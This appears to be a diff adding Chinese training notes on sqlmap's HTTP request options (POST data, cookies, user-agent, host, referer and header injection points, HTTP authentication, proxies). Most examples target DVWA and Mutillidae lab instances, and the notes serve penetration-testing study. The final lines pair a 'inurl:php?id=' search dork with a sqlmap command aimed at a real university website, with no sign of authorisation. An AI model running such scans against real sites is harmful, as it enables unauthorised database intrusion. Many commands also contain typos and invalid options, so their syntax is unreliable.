@@ -1,0 +1,89 @@
+课时93 SQLMAP自动注入-REQUEST
+
+SQLMAP自动注入-----REQUEST
+数据段：   --data
+    get/post都适用
+    sqlmap -u "http://1.1.1.1/a.php" --data="user=1&pass=2" -f
+变量分隔符：--param-del
+    http://1.1.1.1/a.php?q=foo;id=1    // ;  &
+    sqlmap -u "http://1.1.1.1/a.php" --data="q=foo:id=1" --param-del=";" -f
+cookie头： --cookie
+    web应用需要基于cookie的身份认证
+    检查cookie中的注入点（sqlmap自动测试）
+    Set-Cookie / --drop-set-cookie
+    sqlmap -u "http://1.1.1.1/a.php?id=1" --cookie="a=1;b=2" -f
+
+root@R:~# sqlmap -u "http://192.168.1.121/mtillidae/index.php?page=login.php" --data="username=1&password=2&login-php-submit-button=Login" --dbs
+
+root@R:~# sqlmap -u "http://192.168.1.121mutillidae/index.php" --date="page=user-info.php&username=1&password=1&user-info-php-submit-butto=View+Account+Details" --users
+
+root@R:~# sqlmap -u "http:/192.168.1.121/dvwa/vulnerabilites/sqli/?id=1&sSubmit#" --cookie="security=low;PHPSHEEID=48cr8s0v5420dc62ef81b5af13c6e26e" --dbs
+
+SQLMAP自动注入-----REQUEST
+--user-agent
+    sqlmap/1.0-dev-xxxxxx(http://sqlmap.org)
+--random-agent
+    /user/share/sqlmap/txt/user-agents.txt
+sqlmap检查user-agent中的注入点：Leve>=3
+APP/WAF/IPS/IDS过滤异常user-agent时报错
+    [hh:mm:20][ERROR] the target URL responded with an unknow HTTP
+    Status code,try to force the HTTP User-Agent header with option --user-
+    agent or --random-agent
+
+root@R:~# sqlmap -u "http:/192.168.1.121/dvwa/vulnerabilites/sqli/?id=1&sSubmit#" --cookie="security=low;PHPSHEEID=48cr8s0v5420dc62ef81b5af13c6e26e" --level 2 --dbs
+
+root@R:~# sqlmap -u "http:/192.168.1.121/dvwa/vulnerabilites/sqli/?id=1&sSubmit#" --cookie="security=low;PHPSHEEID=48cr8s0v5420dc62ef81b5af13c6e26e" --random-agent --dbs
+
+tcp.stream eq 1
+
+tcp.stream eq 2
+
+root@R:~# sqlmap -u "http:/192.168.1.121/dvwa/vulnerabilites/sqli/?id=1&sSubmit#" --cookie="security=low;PHPSHEEID=48cr8s0v5420dc62ef81b5af13c6e26e" --user-agent="aaaaaaaaaaaaaaaaa" --dbs
+
+root@R:~# sqlmap -u "http:/192.168.1.121/dvwa/vulnerabilites/sqli/?id=1&sSubmit#" --cookie="security=low;PHPSHEEID=48cr8s0v5420dc62ef81b5af13c6e26e" --level 3 --dbs\
+
+root@R:~# sqlmap -u "http:/192.168.1.121/dvwa/vulnerabilites/sqli/?id=1&sSubmit#" --cookie="security=low;PHPSHEEID=48cr8s0v5420dc62ef81b5af13c6e26e" --host="aaaaaaaaaaaaaaaaaa" -f
+
+root@R:~# sqlmap -u "http:/192.168.1.121/dvwa/vulnerabilites/sqli/?id=1&sSubmit#" --cookie="security=low;PHPSHEEID=48cr8s0v5420dc62ef81b5af13c6e26e" --level -f
+
+SQLMAP自动注入-----REQUEST
+Host头：--host
+    Level=5
+Referer头：--referer
+    Level>=3
+额外的header：--headers
+    每个头单独一行（名称分区大小写）
+    sqlmap -u "http://1.1.1.1/a.php?id=1" --
+    header="host:www.a.com\nUser-Agent:yuanfh"
+
+--method=GET/POST
+
+root@R:~# sqlmap -u "http:/192.168.1.121/dvwa/vulnerabilites/sqli/?id=1&sSubmit#" --cookie="security=low;PHPSHEEID=48cr8s0v5420dc62ef81b5af13c6e26e" ----referer="aaaaaaaaaaaaaaaaaa" -f
+
+root@R:~# sqlmap -u "http:/192.168.1.121/dvwa/vulnerabilites/sqli/?id=1&sSubmit#" --cookie="security=low;PHPSHEEID=48cr8s0v5420dc62ef81b5af13c6e26e" ----headers="Host:www.abc.com\nUser-Agent:bbbbbb\n" -f
+
+SQLMAP自动注入-----REQUEST
+基于HTTP协议的身份验证
+    Basic
+    Digest
+    NTLM
+    sqlmap -u "http://1.1.1.1/a.php?id=1" --auth-type Basice --auth-cred "user:pass"
+--auth-cert / --ath-file
+    --ath-file="ca.PEM
+    含有私有的PEM格式证书文件
+    PEM格式的证书链文件
+
+SQLMAP自动注入-----REQUEST
+http(s)代理
+    --proxy="http://127.0.0.1:8087"
+    --proxy-cred="name:pass"
+    --ignore-proxy
+        忽略系统级代理设置，通常用于扫描本地网络目标
+
+sqlmap -u "http://1.1.1.1/a.php?id=1" --proxy="http//127.0.0.1:8087" -f
+
+inurl:php?id=
+
+root@R:~# sqlmap -u "http://zsb.ybu.edu.cn/index.php?id=135" --proxy="http//127.0.0.1:8087" -f
+
+
